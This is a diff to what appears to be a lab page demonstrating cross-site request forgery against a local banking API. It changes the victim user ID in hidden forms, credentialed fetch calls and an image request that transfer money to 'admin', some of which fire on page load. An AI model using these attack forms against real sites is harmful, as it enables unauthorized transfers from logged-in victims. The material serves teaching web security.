@@ -75,7 +75,7 @@
     
     <!-- Attack 1: Transfer money to attacker -->
     <form id="csrfAttack1" class="hidden-form" method="POST" action="http://localhost:5000/api/transfer">
-        <input type="hidden" name="fromUserId" value="2">
+        <input type="hidden" name="fromUserId" value="5">
         <input type="hidden" name="toUsername" value="admin">
         <input type="hidden" name="amount" value="1000">
         <input type="hidden" name="description" value="CSRF Attack - Money stolen!">
@@ -83,7 +83,7 @@
 
     <!-- Attack 2: Auto-executing attack on page load -->
     <form id="autoAttack" class="hidden-form" method="POST" action="http://localhost:5000/api/transfer">
-        <input type="hidden" name="fromUserId" value="3">
+        <input type="hidden" name="fromUserId" value="5">
         <input type="hidden" name="toUsername" value="admin">
         <input type="hidden" name="amount" value="500">
         <input type="hidden" name="description" value="Auto CSRF - Executed on page load">
@@ -127,7 +127,7 @@
                     },
                     credentials: 'include', // Important: includes cookies
                     body: JSON.stringify({
-                        fromUserId: 2, // Assuming user ID 2 is logged in
+                        fromUserId: 5, // User ID for ycp27
                         toUsername: 'admin',
                         amount: 100,
                         description: 'CSRF Attack - Educational Demo'
@@ -156,7 +156,7 @@
                 },
                 credentials: 'include',
                 body: JSON.stringify({
-                    fromUserId: 3,
+                    fromUserId: 5, // User ID for ycp27
                     toUsername: 'admin',
                     amount: 50,
                     description: 'Auto CSRF - Page Load Attack'
@@ -176,7 +176,7 @@
             // Image-based CSRF (won't work for POST with JSON, but demonstrates concept)
             const img = new Image();
             img.src = 'http://localhost:5000/api/transfer?' + 
-                      'fromUserId=2&toUsername=admin&amount=25&description=Image CSRF Attack';
+                      'fromUserId=5&toUsername=admin&amount=25&description=Image CSRF Attack';
             
             img.onerror = function() {
                 alert('Image-based CSRF attempted (will likely fail due to POST requirement)');
